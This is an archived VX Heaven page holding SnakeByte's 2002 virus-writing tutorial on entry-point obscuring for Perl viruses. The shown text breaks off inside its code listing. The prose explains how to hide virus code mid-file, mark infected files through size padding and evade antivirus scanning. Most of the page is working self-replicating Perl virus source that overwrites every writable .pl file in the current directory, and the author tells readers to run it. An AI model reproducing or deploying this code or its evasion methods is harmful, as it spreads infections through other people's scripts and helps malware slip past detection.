<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SnakeByte 'Perl EPO Techniques' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SnakeByte"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SnakeByte,Perl EPO Techniques, snakebyte, print, perl, start, find, spaces, call, file, found, simple, line, insert, make, search, number"/>
<meta name="Description" content="This little tutorial will present you some simple, but effective methods, to hide your perl Virus from detection by analyzing the perl source code."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"776c5a29b56c15fe7bb12d8ce0029523014ac66f-1498756948-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsn09.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Perl EPO Techniques</h1><p><a href="/lib/?lang=en&amp;author=SnakeByte"> SnakeByte</a><br/> <em><a href="/vx.php?fid=11#f11">29a [6]</a></em><br/> <em>March 2002</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsn09.html';</script><div class="ci"><a href="/lib/?ci=vsn09">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsn09">Back to index</a>] [<a href="/lib/vsn09.html#disqus_thread">Comments</a>]<br/> 
<address>
SnakeByte [ <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5a09343b313f18232e3f1a3128232a2e3539283f2d743e3f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ]<br/>
www.kryptocrew.de/snakebyte/
</address>
<p>This little tutorial will present you some simple, but effective methods, to hide your perl Virus from detection by analyzing the perl source code. At the moment all perl virus detections seem to be based on simple string scanning, so are very basic. The idea of this paper is to use Entry Point Techniques, we all know from Win32 PE Infectory, to make the automatic analisation of the virus harder, to prevent it getting detected by the heuristic scanning engines which will possibly show up soon, if perl viruses would get more popular... and I think they will, as somebody told me .."perl is sexy"</p>
<p>The idea is not to habe the perl virus code in the start of the file or a jump / call to it in the start, but to insert a call or the entire source somewhere in the middle of the file, so lots of code needs to be traced before the actual virus would be found.. in the best case, too much for the scanner, and he would fail detecting the virus. So how can we achieve this goal ? There several ways to do this ( TIMTOWTDI ). The one is to insert a call to the virus somewhere in the middle and placing the virus at the end. And the other is to insert the entire virus inside the file.</p>
<p>No matter which way we choose, we need to insert our code somewhere. To do this we need to find a simple way, to parse the code and find a valid point where to include it. This can be done in several ways to. I think the easiest one is to search the perl file from a random line, up or downwards, you decide for a ; which ends every perl statement. Or better for an ;\n or and ; and a space character. This way we can get pretty sure, that we either have found the end of a statement, where we can include our &amp;Virus to call the Virus body. Or we found something like 'print "foo"; print "bar"' So if we searched for a ; inside a string, we can split the line there and divide in into two, and insert the call just between them. Instead of the call, we could also insert our entire virus, just make sure, you use strange variables, so you wouldn't mess up the original code.</p>
<p><strong>How to mark the infection ?</strong></p>
<p>This can be done in various ways, like to align the filesize to a special value, by adding spaces, or make the first line end with 3 spaces in a row, or insert several newlines at the end of the file. This is something a virus scanner can't rely on to be an infection =)</p>
<p>The next problem is that we need to find our own code inside the file, to be able to insert it into another perl script. A weak method could be to insert a comment which you can search for, but this comment could be picked up by an av, which is not good, if you want to implement poly techniques or something similar to hide your scanstring. I think a nice way is a hardcoded line number, like the hardcoded delta offset in some viruses. Let's see some pseudo code first.</p>
<pre class="source">
 [ normal File ]
 [  &lt; Virus >
  $xxx = line number
  open own file
  read y lines from line $xxx
  for file in *
   open file
  search an ;
  get line number
  insert $xxx = line number 
  insert the virus ( the lines we read before )
  done ..      ]
 [ normal File ]
 [ spaces for size padding]
</pre>
<p>I think the concept is very clear at this point, is it ? So let's follow the real code ! Simply drop this to a file and start it, to make it infect all .pl files in the current directory.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<span style="color: black; font-style: italic;">#!/usr/bin/perl</span><br/>
&nbsp;<br/>
&nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;Perl Virus to demonstrate EPO by SnakeByte<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp;<span style="color: black; font-style: italic;"># &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; here starts the virus &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br/>
&nbsp; <span style="color: #0000ff;">$VirLine</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">6</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># in line 7 starts the virus body..</span><br/>
&nbsp; <span style="color: #0000ff;">$VirMaxLine</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">59</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># number of lines in the virus</span><br/>
&nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>VirFile<span style="color: #339933;">,</span><span style="color: #0000ff;">$0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># open our own File</span><br/>
&nbsp; &nbsp;<span style="color: #0000ff;">@Virus</span><span style="color: #339933;">=</span><span style="color: #009999;">&lt;VirFile&gt;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># read the entire file</span><br/>
&nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>VirFile<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># close it</span><br/>
&nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$VirX</span><span style="color: #339933;">=</span><span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirX</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">$VirMaxLine</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirX</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span> <span style="color: black; font-style: italic;"># copy $VirMaxLine lines</span><br/>
&nbsp; &nbsp; <span style="color: #0000ff;">$VirA</span><span style="color: #339933;">=</span><span style="color: #0000ff;">$VirX</span><span style="color: #339933;">+</span><span style="color: #0000ff;">$VirLine</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #0000ff;">@Virus2</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$VirX</span><span style="color: black;">&#93;</span><span style="color: #339933;">=</span><span style="color: #0000ff;">@Virus</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$VirA</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># from $VirLine</span><br/>
&nbsp; &nbsp;<span style="color: black;">&#125;</span> <br/>
&nbsp; <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$VirFileName</span><span style="color: black;">&#40;</span><span style="color: #339933;">&lt;*.</span>pl<span style="color: #339933;">&gt;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># search files</span><br/>
&nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span> <span style="color: #339933;">-</span>r <span style="color: #0000ff;">$VirFileName</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span> <span style="color: #339933;">-</span>w <span style="color: #0000ff;">$VirFileName</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span> <span style="color: #339933;">-</span>f <span style="color: #0000ff;">$VirFileName</span> <span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>VirFile<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;$VirFileName&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># open the file we found</span><br/>
&nbsp; &nbsp; <span style="color: #0000ff;">@VirTemp</span><span style="color: #339933;">=</span><span style="color: #009999;">&lt;VirFile&gt;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># read it</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>VirFile<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># close it</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># check if it is a perl file</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #0000ff;">@VirTemp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">/perl/i</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">or</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@VirTemp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">/perl/i</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #0000ff;">$VirFile2</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/join.html"><span style="color: #000066;">join</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">@VirFile</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># is file already infected ?</span><br/>
&nbsp; &nbsp; <span style="color: #0000ff;">$VirSize</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/length.html"><span style="color: #000066;">length</span></a><span style="color: black;">&#40;</span> <span style="color: #0000ff;">$VirFile2</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$VirSize</span> <span style="color: #339933;">%</span> <span style="color: #cc66cc;">10</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> <span style="color: #cc66cc;">0</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$VirX</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@VirTemp</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&gt;&gt;</span> <span style="color: #cc66cc;">1</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirX</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">@VirTemp</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirX</span><span style="color: #339933;">++</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">@VirTemp</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$VirX</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=~</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\;</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span> <span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># We found a ;\n and infect this file !</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># Copy all lines below into a new array</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$VirY</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirY</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">$VirX</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirY</span><span style="color: #339933;">++</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@VirNEW</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$VirY</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;@VirTemp[$VirY]&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># now we insert the virus</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$VirY</span><span style="color: #339933;">++;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># set the line number</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">@VirNEW</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$VirY</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\$</span>VirLine = $VirX<span style="color: #000099; font-weight: bold;">\;</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$VirY</span><span style="color: #339933;">++;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$VirZ</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirZ</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">$VirMaxLine</span> <span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirZ</span><span style="color: #339933;">++</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@VirNEW</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$VirY</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@Virus2</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$VirZ</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$VirY</span><span style="color: #339933;">++;</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># and insert rest of the original file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$VirZ</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$VirX</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirZ</span> <span style="color: #339933;">&lt;</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">@VirTemp</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirZ</span><span style="color: #339933;">++</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@VirNEW</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$VirY</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;@VirTemp[$VirZ]&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$VirY</span><span style="color: #339933;">++;</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span> &nbsp;<br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$VirFile2</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/join.html"><span style="color: #000066;">join</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">@VirNEW</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># do padding with spaces</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$VirSize</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/length.html"><span style="color: #000066;">length</span></a><span style="color: black;">&#40;</span> <span style="color: #0000ff;">$VirFile2</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Laenge : $VirSize <span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$VirSize</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$VirSize</span> <span style="color: #339933;">%</span> <span style="color: #cc66cc;">10</span><span style="color: #339933;">;</span> &nbsp; &nbsp; <span style="color: #339933;">;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Size mod 10 : $VirSize <span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">$VirSize</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">10</span> <span style="color: #339933;">-</span> <span style="color: #0000ff;">$VirSize</span><span style="color: #339933;">;</span> &nbsp; &nbsp; <span style="color: #339933;">;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Padding: $VirSize <span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$VirX</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">1</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirX</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">$VirSize</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$VirX</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">@VirNEW</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$VirY</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;@VirNEW[$VirY] &quot;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># add spaces</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># end padding</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># write the new file to disk</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>VirFile<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$VirFileName&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> VirFile <span style="color: #ff0000;">&quot;@VirNEW&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>VirFile<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/goto.html"><span style="color: #000066;">goto</span></a> VirEND<br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># End Infect</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># End Search for ;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># End Perl File Check if</span><br/>
&nbsp; &nbsp;<span style="color: black;">&#125;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># End Infected ? If</span><br/>
